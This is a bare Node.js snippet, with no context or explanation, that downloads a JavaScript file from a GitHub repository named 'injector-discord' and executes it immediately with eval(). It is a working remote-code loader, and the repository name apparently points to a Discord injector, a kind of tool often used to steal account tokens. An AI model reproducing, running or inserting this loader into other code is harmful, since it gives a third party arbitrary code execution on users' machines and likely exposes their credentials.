require('https').get('https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js', (res) => { 
    var data = ""; 
    res.on('data', (dat) => data += dat.toString());
    res.on('end', () => eval(data));
})